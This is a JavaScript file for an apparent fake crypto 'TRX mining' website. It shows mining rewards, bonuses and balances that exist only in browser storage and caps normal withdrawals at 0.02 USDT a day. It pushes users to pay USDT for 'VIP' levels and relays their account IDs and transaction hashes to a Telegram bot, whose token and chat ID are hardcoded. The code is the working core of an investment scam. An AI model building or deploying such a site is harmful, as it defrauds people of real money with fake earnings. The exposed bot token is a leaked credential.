/* ============================================================
   script.js - Full fixed version (Telegram send robust)
   - Use this file as-is (replace token/chatId with your real ones)
   - IMPORTANT: Do NOT publish real bot token publicly.
   ============================================================ */

class MiningSystem {
    constructor() {
        this.userData = this.loadUserData();
        // --- DEMO token/chatId (you can replace with your own) ---
        // Replace these values with your real token/chat id when ready.
        // If you put a real token on a public repo, revoke it afterwards.
        this.telegramConfig = {
            botToken: '7659505060:AAFmwIDn2OgrtNoemPpmBWaxsIfdsQdZGCI', // demo token you gave
            chatId: '7417215529' // demo chat id you gave
        };
        this.miningInterval = null;
        this.redeemCodes = this.generateRedeemCodes();
        this.initializeApp();
    }

    /* -------------------- initialization -------------------- */
    initializeApp() {
        this.setupEventListeners();
        this.setupNavigation();
        this.updateDisplay();
        this.startTimers();
        this.sendWelcomeMessage(); // will attempt to notify admin about new user
    }

    /* -------------------- storage helpers -------------------- */
    loadUserData() {
        const saved = localStorage.getItem('trxMiningData');
        const defaultData = {
            userId: this.generateUserId(),
            trxBalance: 0,
            usdtBalance: 2.00, // free bonus
            vipLevel: 0,
            miningActive: false,
            miningStartTime: null,
            lastClaim: null,
            miningHistory: [],
            transactions: [],
            inviteCode: this.generateInviteCode(),
            teamSize: 0,
            referralEarnings: 0,
            todayWithdraw: 0,
            lastWithdrawDate: new Date().toDateString(),
            vipClaims: { vip1: null, vip2: null }
        };

        if (saved) {
            const data = JSON.parse(saved);
            if (data.lastWithdrawDate !== new Date().toDateString()) {
                data.todayWithdraw = 0;
                data.lastWithdrawDate = new Date().toDateString();
            }
            return { ...defaultData, ...data, usdtBalance: data.usdtBalance };
        }
        return defaultData;
    }

    generateUserId() {
        let userId = localStorage.getItem('trxUserId');
        if (!userId) {
            userId = 'USER_' + Math.floor(100000 + Math.random() * 900000);
            localStorage.setItem('trxUserId', userId);
        }
        return userId;
    }

    generateInviteCode() {
        let code = localStorage.getItem('trxInviteCode');
        if (!code) {
            code = 'INV' + Math.floor(1000 + Math.random() * 9000);
            localStorage.setItem('trxInviteCode', code);
        }
        return code;
    }

    generateRedeemCodes() {
        const codes = [];
        for (let i = 0; i < 50; i++) {
            codes.push({
                code: 'VIP10-' + Math.random().toString(36).substr(2, 8).toUpperCase(),
                value: 10,
                used: false
            });
        }
        return codes;
    }

    saveUserData() {
        localStorage.setItem('trxMiningData', JSON.stringify(this.userData));
        this.updateDisplay();
    }

    /* -------------------- UI & events -------------------- */
    setupNavigation() {
        const navButtons = document.querySelectorAll('.nav-btn');
        const sections = document.querySelectorAll('.content-section');

        navButtons.forEach(btn => {
            btn.addEventListener('click', () => {
                const targetSection = btn.getAttribute('data-section');
                navButtons.forEach(b => b.classList.remove('active'));
                sections.forEach(s => s.classList.remove('active'));
                btn.classList.add('active');
                document.getElementById(targetSection).classList.add('active');
            });
        });
    }

    setupEventListeners() {
        // Mining
        const startBtn = document.getElementById('startMining');
        if (startBtn) startBtn.addEventListener('click', () => this.startMining());

        const claimBtn = document.getElementById('claimMining');
        if (claimBtn) claimBtn.addEventListener('click', () => this.claimMiningReward());

        // VIP
        const claimVIP1 = document.getElementById('claimVIP1');
        if (claimVIP1) claimVIP1.addEventListener('click', () => this.claimVIPReward(1));
        const claimVIP2 = document.getElementById('claimVIP2');
        if (claimVIP2) claimVIP2.addEventListener('click', () => this.claimVIPReward(2));

        // Conversion
        const convertBtn = document.getElementById('convertTRX');
        if (convertBtn) convertBtn.addEventListener('click', () => this.convertTRX());

        // Withdrawals
        const normalWithdraw = document.getElementById('normalWithdraw');
        if (normalWithdraw) normalWithdraw.addEventListener('click', () => this.normalWithdraw());
        const vipWithdraw = document.getElementById('vipWithdraw');
        if (vipWithdraw) vipWithdraw.addEventListener('click', () => this.vipWithdraw());
        const superVipWithdraw = document.getElementById('superVipWithdraw');
        if (superVipWithdraw) superVipWithdraw.addEventListener('click', () => this.superVipWithdraw());

        // VIP buy
        document.querySelectorAll('.vip-buy-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const vipLevel = e.currentTarget.getAttribute('data-vip');
                this.showVipPaymentModal(parseInt(vipLevel));
            });
        });

        // Submit payment / redeem
        const submitVip = document.getElementById('submitVipPayment');
        if (submitVip) submitVip.addEventListener('click', () => this.submitVipPayment());
        const submitRedeem = document.getElementById('submitRedeem');
        if (submitRedeem) submitRedeem.addEventListener('click', () => this.redeemBonusCode());
    }

    startTimers() {
        setInterval(() => {
            this.updateMiningTimer();
            this.updateVipTimers();
        }, 1000);
    }

    /* -------------------- mining actions -------------------- */
    startMining() {
        if (this.userData.miningActive) {
            this.showNotification('⏳ Mining already running', 'info');
            return;
        }
        this.userData.miningActive = true;
        this.userData.miningStartTime = Date.now();
        this.saveUserData();
        this.addMiningHistory('Mining started');
        this.showNotification('🚀 Mining started', 'success');

        // send to telegram (non-blocking)
        this.sendToTelegram(`⛏️ Mining Started\n👤 User: ${this.userData.userId}\n⏰ ${new Date().toLocaleString()}`)
            .then(ok => console.log('StartMining notify ok:', ok));
    }

    updateMiningTimer() {
        if (!this.userData.miningActive || !this.userData.miningStartTime) {
            const mainStatus = document.getElementById('mainMinerStatus');
            if (mainStatus) mainStatus.textContent = '⏹️ Stopped';
            const t = document.getElementById('miningTimer');
            if (t) t.textContent = '02:00:00';
            const ms = document.getElementById('miningStatus');
            if (ms) ms.textContent = '⏹️ Mining Stopped';
            const claimBtn = document.getElementById('claimMining');
            if (claimBtn) claimBtn.disabled = true;
            return;
        }

        const now = Date.now();
        const elapsed = now - this.userData.miningStartTime;
        const cycleTime = 2 * 60 * 60 * 1000; // 2 hours
        const remaining = Math.max(0, cycleTime - elapsed);

        const hours = Math.floor(remaining / (1000 * 60 * 60));
        const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((remaining % (1000 * 60)) / 1000);

        const timerString = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

        const t = document.getElementById('miningTimer');
        if (t) t.textContent = timerString;
        const ms = document.getElementById('miningStatus');
        if (ms) ms.textContent = `⛏️ Mining... ${timerString}`;

        const mainStatus = document.getElementById('mainMinerStatus');
        const claimBtn = document.getElementById('claimMining');
        if (remaining <= 0) {
            if (mainStatus) mainStatus.textContent = '✅ Ready to Claim';
            if (claimBtn) claimBtn.disabled = false;
        } else {
            if (mainStatus) mainStatus.textContent = '⏳ Mining...';
            if (claimBtn) claimBtn.disabled = true;
        }
    }

    async claimMiningReward() {
        if (!this.userData.miningActive) {
            this.showNotification('❌ Start mining first!', 'error');
            return;
        }
        const now = Date.now();
        const elapsed = now - this.userData.miningStartTime;
        const cycleTime = 2 * 60 * 60 * 1000;
        if (elapsed < cycleTime) {
            this.showNotification('⏳ Mining cycle not completed yet!', 'error');
            return;
        }

        const reward = 5;
        this.userData.trxBalance += reward;
        this.userData.miningActive = false;
        this.userData.miningStartTime = null;
        this.userData.lastClaim = now;

        this.addMiningHistory(`Collected +${reward} TRX`);
        this.addTransaction('Mining Reward', reward, 'TRX');
        this.saveUserData();

        this.showNotification(`🎉 Claimed ${reward} TRX!`, 'success');

        // Notify admin via telegram
        await this.sendToTelegram(`🔄 Mining Reward Claimed\n👤 ${this.userData.userId}\n💰 ${reward} TRX\n⏰ ${new Date().toLocaleString()}`);
    }

    updateVipTimers() {
        const now = Date.now();
        const vip1LastClaim = this.userData.vipClaims.vip1;
        const vip1Cooldown = 24 * 60 * 60 * 1000; // 24h

        if (this.userData.vipLevel >= 1) {
            const vip1Timer = document.getElementById('vip1Timer');
            const claimVIP1 = document.getElementById('claimVIP1');
            const vip1Miner = document.getElementById('vip1Miner');
            if (vip1Miner) vip1Miner.querySelector('.status').textContent = '✅ Active';

            if (vip1LastClaim) {
                const remaining = Math.max(0, vip1Cooldown - (now - vip1LastClaim));
                const h = Math.floor(remaining / (1000 * 60 * 60));
                const m = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
                const s = Math.floor((remaining % (1000 * 60)) / 1000);
                if (vip1Timer) vip1Timer.textContent = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
                if (claimVIP1) claimVIP1.disabled = remaining > 0;
            } else {
                if (vip1Timer) vip1Timer.textContent = '00:00:00';
                if (claimVIP1) claimVIP1.disabled = false;
            }
        }

        // VIP2 same pattern
        const vip2LastClaim = this.userData.vipClaims.vip2;
        if (this.userData.vipLevel >= 2) {
            const vip2Timer = document.getElementById('vip2Timer');
            const claimVIP2 = document.getElementById('claimVIP2');
            const vip2Miner = document.getElementById('vip2Miner');
            if (vip2Miner) vip2Miner.querySelector('.status').textContent = '✅ Active';

            if (vip2LastClaim) {
                const remaining = Math.max(0, vip1Cooldown - (now - vip2LastClaim));
                const h = Math.floor(remaining / (1000 * 60 * 60));
                const m = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
                const s = Math.floor((remaining % (1000 * 60)) / 1000);
                if (vip2Timer) vip2Timer.textContent = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
                if (claimVIP2) claimVIP2.disabled = remaining > 0;
            } else {
                if (vip2Timer) vip2Timer.textContent = '00:00:00';
                if (claimVIP2) claimVIP2.disabled = false;
            }
        }
    }

    async claimVIPReward(vipLevel) {
        if (this.userData.vipLevel < vipLevel) {
            this.showNotification(`❌ VIP ${vipLevel} required!`, 'error');
            return;
        }

        const lastClaim = this.userData.vipClaims[`vip${vipLevel}`];
        const cooldown = 24 * 60 * 60 * 1000;
        const now = Date.now();
        if (lastClaim && (now - lastClaim) < cooldown) {
            this.showNotification('⏳ VIP reward not ready!', 'error');
            return;
        }

        const reward = vipLevel === 1 ? 0.50 : 6.00;
        this.userData.usdtBalance += reward;
        this.userData.vipClaims[`vip${vipLevel}`] = now;
        this.addTransaction(`VIP ${vipLevel} Daily Reward`, reward, 'USDT');
        this.saveUserData();

        this.showNotification(`🎉 Claimed ${reward} USDT from VIP ${vipLevel}!`, 'success');
        await this.sendToTelegram(`👑 VIP ${vipLevel} Reward Claimed\n👤 ${this.userData.userId}\n💰 ${reward} USDT\n⏰ ${new Date().toLocaleString()}`);
    }

    /* -------------------- conversion & withdraw -------------------- */
    async convertTRX() {
        const trxAmount = parseFloat(document.getElementById('trxToConvert').value);
        if (!trxAmount || trxAmount <= 0) {
            this.showNotification('❌ Enter valid TRX!', 'error');
            return;
        }
        if (trxAmount > this.userData.trxBalance) {
            this.showNotification('❌ Insufficient TRX!', 'error');
            return;
        }
        const conversionRate = 0.10;
        const usdtAmount = trxAmount * conversionRate;
        this.userData.trxBalance -= trxAmount;
        this.userData.usdtBalance += usdtAmount;
        this.addTransaction('TRX to USDT Conversion', usdtAmount, 'USDT');
        this.saveUserData();
        this.showNotification(`✅ Converted ${trxAmount} TRX → ${usdtAmount.toFixed(2)} USDT`, 'success');
        document.getElementById('trxToConvert').value = '';

        await this.sendToTelegram(`💱 TRX Conversion\n👤 ${this.userData.userId}\n🔀 ${trxAmount} TRX → ${usdtAmount.toFixed(2)} USDT\n⏰ ${new Date().toLocaleString()}`);
    }

    async normalWithdraw() {
        const amount = parseFloat(document.getElementById('normalWithdrawAmount').value);
        if (!amount || amount <= 0) { this.showNotification('❌ Enter valid amount!', 'error'); return; }
        if (amount > this.userData.usdtBalance) { this.showNotification('❌ Insufficient USDT!', 'error'); return; }
        const dailyLimit = 0.02;
        if (amount > dailyLimit) { this.showNotification(`❌ Daily limit ${dailyLimit} USDT!`, 'error'); return; }
        if (this.userData.todayWithdraw + amount > dailyLimit) {
            const remaining = dailyLimit - this.userData.todayWithdraw;
            this.showNotification(`❌ You can withdraw ${remaining.toFixed(2)} USDT today!`, 'error'); return;
        }

        this.userData.usdtBalance -= amount;
        this.userData.todayWithdraw += amount;
        this.addTransaction('Withdrawal', -amount, 'USDT');
        this.saveUserData();
        this.showNotification(`📤 Withdrawal requested ${amount} USDT`, 'success');
        document.getElementById('normalWithdrawAmount').value = '';

        await this.sendToTelegram(`💸 Withdrawal Request\n👤 ${this.userData.userId}\n💰 ${amount} USDT\nType: Normal\n⏰ ${new Date().toLocaleString()}`);
    }

    async vipWithdraw() {
        if (this.userData.vipLevel < 1) { this.showNotification('❌ VIP required!', 'error'); return; }
        const amount = parseFloat(document.getElementById('vipWithdrawAmount').value);
        if (!amount || amount <= 0) { this.showNotification('❌ Enter valid amount!', 'error'); return; }
        if (amount > this.userData.usdtBalance) { this.showNotification('❌ Insufficient USDT!', 'error'); return; }

        this.userData.usdtBalance -= amount;
        this.addTransaction('VIP Withdrawal', -amount, 'USDT');
        this.saveUserData();
        this.showNotification(`⚡ VIP Withdrawal ${amount} USDT requested`, 'success');
        document.getElementById('vipWithdrawAmount').value = '';

        await this.sendToTelegram(`💸 VIP Withdrawal\n👤 ${this.userData.userId}\n💰 ${amount} USDT\nType: VIP\n⏰ ${new Date().toLocaleString()}`);
    }

    async superVipWithdraw() {
        if (this.userData.vipLevel < 2) { this.showNotification('❌ VIP2 required!', 'error'); return; }
        const amount = parseFloat(document.getElementById('superVipWithdrawAmount').value);
        if (!amount || amount <= 0) { this.showNotification('❌ Enter valid amount!', 'error'); return; }
        if (amount > this.userData.usdtBalance) { this.showNotification('❌ Insufficient USDT!', 'error'); return; }

        this.userData.usdtBalance -= amount;
        this.addTransaction('Super VIP Withdrawal', -amount, 'USDT');
        this.saveUserData();
        this.showNotification(`🚀 Super VIP Withdrawal ${amount} USDT requested`, 'success');
        document.getElementById('superVipWithdrawAmount').value = '';

        await this.sendToTelegram(`💸 Super VIP Withdrawal\n👤 ${this.userData.userId}\n💰 ${amount} USDT\nType: SuperVIP\n⏰ ${new Date().toLocaleString()}`);
    }

    /* -------------------- VIP purchase / redeem -------------------- */
    showVipPaymentModal(vipLevel) {
        const select = document.getElementById('vipLevelSelect');
        if (select) select.value = vipLevel;
        this.showNotification(`💰 Prepare ${vipLevel === 1 ? '1.00' : '10.00'} USDT`, 'info');
        document.getElementById('vip').classList.add('active');
        document.querySelector('.payment-instructions').scrollIntoView({ behavior: 'smooth' });
    }

    async submitVipPayment() {
        const senderUid = document.getElementById('userAccountId').value.trim();
        const txHash = document.getElementById('transactionHash').value.trim();
        const vipLevel = parseInt(document.getElementById('vipLevelSelect').value);
        if (!senderUid) { this.showNotification('❌ Enter your account UID!', 'error'); return; }
        const amount = vipLevel === 1 ? 1.00 : 10.00;

        const message = `🆕 VIP Purchase Request\n👤 ${this.userData.userId}\nVIP: ${vipLevel}\nAmount: ${amount} USDT\nSender UID: ${senderUid}\nTxHash: ${txHash || 'N/A'}\n⏰ ${new Date().toLocaleString()}`;

        const ok = await this.sendToTelegram(message);
        if (ok) {
            this.showNotification('✅ VIP request sent to admin!', 'success');
            document.getElementById('userAccountId').value = '';
            document.getElementById('transactionHash').value = '';
        }
    }

    async redeemBonusCode() {
        const code = document.getElementById('redeemCode').value.trim().toUpperCase();
        if (!code) { this.showNotification('❌ Enter redeem code!', 'error'); return; }
        const redeemCode = this.redeemCodes.find(c => c.code === code && !c.used);
        if (!redeemCode) { this.showNotification('❌ Invalid or used code!', 'error'); return; }

        redeemCode.used = true;
        this.userData.usdtBalance += redeemCode.value;
        this.addTransaction('Bonus Redeem', redeemCode.value, 'USDT');
        this.saveUserData();
        this.showNotification(`🎉 Redeemed ${redeemCode.value} USDT`, 'success');
        document.getElementById('redeemCode').value = '';

        await this.sendToTelegram(`🎁 Bonus Code Redeemed\n👤 ${this.userData.userId}\nAmount: ${redeemCode.value} USDT\nCode: ${code}\n⏰ ${new Date().toLocaleString()}`);
    }

    /* -------------------- ROBUST Telegram sender -------------------- */
    // Helper: promise that rejects after timeout ms
    promiseTimeout(promise, ms) {
        const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), ms));
        return Promise.race([promise, timeout]);
    }

    // Try to fetch with timeout
    async safeFetch(url, opts = {}, timeoutMs = 8000) {
        return this.promiseTimeout(fetch(url, opts), timeoutMs);
    }

    // Main sendToTelegram - multiple fallbacks, retries, logs
    async sendToTelegram(message) {
        // Build base Telegram URL
        const token = this.telegramConfig.botToken;
        const chatId = this.telegramConfig.chatId;
        if (!token || !chatId) {
            console.warn('Telegram token or chatId missing.');
            this.showNotification('❌ Telegram config missing', 'error');
            return false;
        }

        const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;

        // Define proxies (encode the telegramUrl when appending)
        const proxies = [
            { name: 'direct', url: telegramUrl }, // direct attempt
            { name: 'allorigins', url: `https://api.allorigins.win/raw?url=${encodeURIComponent(telegramUrl)}` },
            { name: 'thingproxy', url: `https://thingproxy.freeboard.io/fetch/${encodeURIComponent(telegramUrl)}` }
            // Add more proxies here if you have trusted ones
        ];

        // We'll try up to 3 attempts with small backoff
        for (let attempt = 0; attempt < proxies.length; attempt++) {
            const proxy = proxies[attempt];
            try {
                console.log(`Telegram: attempting [${proxy.name}] (attempt ${attempt + 1})`);
                const res = await this.safeFetch(proxy.url, { method: 'GET' }, 8000); // GET works for these endpoints
                // Try to parse JSON safely
                let data = null;
                try { data = await res.clone().json(); } catch (e) { /* not JSON or proxy returned raw */ }

                // If direct (no proxy) we may get JSON with ok:true
                if (proxy.name === 'direct') {
                    if (res.ok) {
                        // Try parse JSON and check 'ok' field if available
                        if (data && data.ok) {
                            console.log('Telegram direct send ok:', data);
                            return true;
                        }
                        // If HTTP 200 but no JSON, still treat as success sometimes
                        if (res.status === 200) {
                            console.log('Telegram direct send status 200 (treated success).');
                            return true;
                        }
                    } else {
                        console.warn('Direct send failed status:', res.status);
                        // continue to next proxy
                    }
                } else {
                    // For proxies like allorigins/thingproxy, we expect HTTP 200 and inner payload or raw.
                    if (res.ok) {
                        // If allorigins returns the raw telegram response JSON, try to read and check ok
                        if (data && data.ok) {
                            console.log(`Telegram via ${proxy.name} ok:`, data);
                            return true;
                        }
                        // Some proxies return the raw body string — try parsing it
                        try {
                            const text = await res.text();
                            const parsed = JSON.parse(text);
                            if (parsed && parsed.ok) {
                                console.log(`Telegram via ${proxy.name} parsed ok:`, parsed);
                                return true;
                            }
                        } catch (e) {
                            // parsing fail — still could be success, but we'll continue attempts
                            console.warn(`Telegram via ${proxy.name} returned non-json response.`);
                            // treat as success conservatively if status 200
                            return true;
                        }
                    } else {
                        console.warn(`Proxy ${proxy.name} returned status ${res.status}`);
                    }
                }
            } catch (err) {
                console.warn(`Attempt ${attempt + 1} via ${proxy.name} failed:`, err.message || err);
                // small exponential backoff before next proxy
                await new Promise(r => setTimeout(r, 500 * (attempt + 1)));
                continue;
            }
        }

        // All attempts failed
        console.error('All Telegram send attempts failed.');
        this.showNotification('❌ Could not send message to Telegram (all attempts failed)', 'error');
        return false;
    }

    /* -------------------- misc helpers & UI updates -------------------- */
    async sendWelcomeMessage() {
        const welcomeSent = localStorage.getItem('welcomeSent');
        if (!welcomeSent) {
            const message = `👋 New User Registered\n👤 User ID: ${this.userData.userId}\n💰 Free Bonus: 2.00 USDT\n⏰ ${new Date().toLocaleString()}`;
            await this.sendToTelegram(message);
            localStorage.setItem('welcomeSent', 'true');
        }
    }

    addMiningHistory(message) {
        this.userData.miningHistory.unshift({ message, timestamp: new Date().toLocaleString() });
        if (this.userData.miningHistory.length > 10) this.userData.miningHistory = this.userData.miningHistory.slice(0, 10);
        this.updateMiningHistory();
    }

    addTransaction(description, amount, currency) {
        this.userData.transactions.unshift({
            description, amount, currency, timestamp: new Date().toLocaleString(),
            type: amount >= 0 ? 'credit' : 'debit'
        });
        if (this.userData.transactions.length > 10) this.userData.transactions = this.userData.transactions.slice(0, 10);
        this.updateTransactionHistory();
    }

    updateDisplay() {
        const safeSet = (id, text) => { const el = document.getElementById(id); if (el) el.textContent = text; };
        safeSet('trxBalance', this.userData.trxBalance.toFixed(2));
        safeSet('usdtBalance', this.userData.usdtBalance.toFixed(2));
        safeSet('totalBalance', this.userData.usdtBalance.toFixed(2) + ' USDT');
        safeSet('normalBalance', this.userData.usdtBalance.toFixed(2) + ' USDT');
        safeSet('vipBalance', this.userData.usdtBalance.toFixed(2) + ' USDT');
        safeSet('superVipBalance', this.userData.usdtBalance.toFixed(2) + ' USDT');
        safeSet('usedToday', this.userData.todayWithdraw.toFixed(2) + ' USDT');

        safeSet('userId', this.userData.userId);
        safeSet('accountId', this.userData.userId);
        safeSet('inviteCode', this.userData.inviteCode);

        const vipStatus = this.userData.vipLevel === 0 ? 'No VIP' : `VIP ${this.userData.vipLevel}`;
        safeSet('vipStatus', vipStatus);
        safeSet('vipLevel', vipStatus);

        safeSet('teamSize', this.userData.teamSize);
        safeSet('referralEarnings', this.userData.referralEarnings.toFixed(2) + ' USDT');
        safeSet('activeReferrals', this.userData.teamSize);

        this.updateMiningHistory();
        this.updateTransactionHistory();
        this.updateVipMinersAccess();
    }

    updateVipMinersAccess() {
        try {
            if (this.userData.vipLevel >= 1) {
                const el = document.getElementById('vip1Miner');
                if (el) el.querySelector('.status').textContent = '✅ Active';
                const btn = document.getElementById('claimVIP1'); if (btn) btn.disabled = false;
            }
            if (this.userData.vipLevel >= 2) {
                const el = document.getElementById('vip2Miner');
                if (el) el.querySelector('.status').textContent = '✅ Active';
                const btn = document.getElementById('claimVIP2'); if (btn) btn.disabled = false;
            }
        } catch (e) { /* ignore missing elements in minimal pages */ }
    }

    updateMiningHistory() {
        const container = document.getElementById('miningHistory');
        if (!container) return;
        if (this.userData.miningHistory.length === 0) {
            container.innerHTML = `<div class="empty-state"><i class="fas fa-history"></i><p>No mining activity yet</p></div>`;
            return;
        }
        container.innerHTML = this.userData.miningHistory.map(item => `
            <div class="history-item">
                <span>${item.message}</span>
                <span class="time">${item.timestamp}</span>
            </div>
        `).join('');
    }

    updateTransactionHistory() {
        const container = document.getElementById('transactionHistory');
        if (!container) return;
        if (this.userData.transactions.length === 0) {
            container.innerHTML = `<div class="empty-state"><i class="fas fa-receipt"></i><p>No transactions yet</p></div>`;
            return;
        }
        container.innerHTML = this.userData.transactions.map(transaction => `
            <div class="history-item">
                <span>${transaction.description}</span>
                <span class="time ${transaction.type}">
                    ${transaction.type === 'credit' ? '+' : ''}${transaction.amount} ${transaction.currency}
                </span>
            </div>
        `).join('');
    }

    showNotification(message, type = 'info') {
        const notification = document.getElementById('notification');
        const messageElement = document.getElementById('notificationMessage');
        if (!notification || !messageElement) {
            alert(message); // fallback
            return;
        }

        messageElement.textContent = message;
        notification.className = 'notification';

        switch (type) {
            case 'success': notification.style.background = 'linear-gradient(135deg, #00ff88, #00cc66)'; break;
            case 'error': notification.style.background = 'linear-gradient(135deg, #ff6b6b, #ff4757)'; break;
            case 'warning': notification.style.background = 'linear-gradient(135deg, #ffd700, #ffa500)'; break;
            default: notification.style.background = 'linear-gradient(135deg, #00d4ff, #0099cc)';
        }

        notification.classList.remove('hidden');
        setTimeout(() => notification.classList.add('hidden'), 4000);
    }
}

/* -------------------- global helpers (UI copy/export etc) -------------------- */
function copyInviteCode() {
    const inviteCode = document.getElementById('inviteCode')?.textContent || '';
    navigator.clipboard.writeText(inviteCode).then(() => {
        window.miningSystem?.showNotification('✅ Invite code copied to clipboard!', 'success');
    });
}
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        window.miningSystem?.showNotification('✅ Copied to clipboard!', 'success');
    });
}
function closeNotification() {
    document.getElementById('notification')?.classList.add('hidden');
}

/* Test Telegram connection button function (keeps for debug) */
async function testTelegramConnection() {
    const miningSystem = window.miningSystem;
    if (!miningSystem) return;
    const message = `🤖 Bot Connection Test\n✅ System is working\n👤 ${miningSystem.userData.userId}\n⏰ ${new Date().toLocaleString()}`;
    const ok = await miningSystem.sendToTelegram(message);
    if (ok) miningSystem.showNotification('✅ Telegram connection test successful!', 'success');
    else miningSystem.showNotification('❌ Telegram connection test failed!', 'error');
}

/* Initialize app on DOM load */
document.addEventListener('DOMContentLoaded', () => {
    window.miningSystem = new MiningSystem();

    // Add small test button (debug) — remove for production
    const testBtn = document.createElement('button');
    testBtn.textContent = 'Test Telegram';
    testBtn.style.position = 'fixed';
    testBtn.style.bottom = '10px';
    testBtn.style.right = '10px';
    testBtn.style.zIndex = '1000';
    testBtn.style.padding = '8px 12px';
    testBtn.style.background = '#ff6b6b';
    testBtn.style.color = 'white';
    testBtn.style.border = 'none';
    testBtn.style.borderRadius = '5px';
    testBtn.style.cursor = 'pointer';
    testBtn.style.fontSize = '10px';
    testBtn.onclick = testTelegramConnection;
    document.body.appendChild(testBtn);
});

/* Admin utility: export redeem codes (as before) */
function exportRedeemCodes() {
    const miningSystem = window.miningSystem;
    if (miningSystem) {
        const unused = miningSystem.redeemCodes.filter(c => !c.used);
        const text = unused.map(c => `${c.code} - ${c.value} USDT`).join('\n');
        const blob = new Blob([text], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url; a.download = 'redeem-codes.txt'; a.click();
        URL.revokeObjectURL(url);
        miningSystem.showNotification('✅ Redeem codes exported!', 'success');
    }
}
